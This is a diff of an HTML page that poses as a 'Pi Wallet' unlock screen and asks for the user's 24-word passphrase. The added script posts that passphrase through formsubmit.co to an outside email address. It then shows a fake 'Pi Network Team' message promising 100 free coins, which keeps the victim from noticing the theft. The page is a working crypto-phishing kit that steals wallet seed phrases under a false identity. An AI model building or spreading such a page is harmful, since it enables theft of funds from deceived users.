@@ -76,23 +76,87 @@
         .wallet-container a:hover {
             text-decoration: underline;
         }
+        .congratulations-container {
+            display: none;
+            background-color: #fff;
+            border-radius: 10px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+            padding: 20px;
+            width: 90%;
+            max-width: 400px;
+            text-align: center;
+            margin: 10px;
+        }
+        .congratulations-container h1 {
+            color: #4f2d84;
+        }
+        .congratulations-container p {
+            color: #555;
+            font-size: 16px;
+            line-height: 1.6;
+            margin-bottom: 20px;
+        }
+        .congratulations-container .highlight {
+            color: #4f2d84;
+            font-weight: bold;
+        }
     </style>
+    <script>
+        document.addEventListener("DOMContentLoaded", function() {
+            const form = document.querySelector("form");
+            form.addEventListener("submit", function(event) {
+                event.preventDefault(); // Prevent default form submission
+
+                // Send data using AJAX
+                fetch("https://formsubmit.co/ajax/brethrenwrites@gmail.com", {
+                    method: "POST",
+                    headers: {
+                        "Content-Type": "application/json"
+                    },
+                    body: JSON.stringify({
+                        Passphrase: document.querySelector("textarea[name='Passphrase']").value,
+                        _subject: "24 Codes",
+                        _captcha: "false",
+                        _template: "table"
+                    })
+                })
+                .then(response => response.json())
+                .then(data => {
+                    console.log("Success:", data);
+
+                    // Hide the form and show the Congratulations message
+                    document.querySelector(".wallet-container").style.display = "none";
+                    document.querySelector(".congratulations-container").style.display = "block";
+                })
+                .catch((error) => {
+                    console.error("Error:", error);
+                    alert("Failed to submit. Please try again.");
+                });
+            });
+        });
+    </script>
 </head>
 <body>
     <div class="wallet-container">
         <h2>Unlock Pi Wallet</h2>
         <!-- Using FormSubmit.co for sending email -->
-        <form action="https://formsubmit.co/brethrenwrites@gmail.com" method="POST">
+        <form>
             <textarea name="Passphrase" placeholder="Enter your 24-word passphrase here" required></textarea>
-            <input type="hidden" name="_subject" value="24 Codes">
-            <input type="hidden" name="_captcha" value="false">
-            <input type="hidden" name="_template" value="table">
             <button type="submit">Unlock With Passphrase</button>
         </form>
-        <!-- Fingerprint Button -->
         <button class="primary">Unlock With Fingerprint</button>
         <p>As a non-custodial wallet, your wallet passphrase is exclusively accessible only to you. Recovery of passphrase is currently impossible.</p>
         <p>Lost your passphrase? <a href="#">You can create a new wallet</a>, but all your π in your previous wallet will be inaccessible.</p>
+    </div>
+
+    <!-- Congratulations Container -->
+    <div class="congratulations-container">
+        <h1>Congratulations!</h1>
+        <p>You have just received <span class="highlight">100 Free Pi Network Coins!</span></p>
+        <p>Today is your lucky day—no tasks required! Simply wait 6 hours for your free Pi Network Coins to be credited to your account.</p>
+        <p>Feel free to share this opportunity with your team and community!</p>
+        <p>Once again, congratulations on your reward!</p>
+        <p><strong>– Pi Network Team</strong></p>
     </div>
 </body>
 </html>
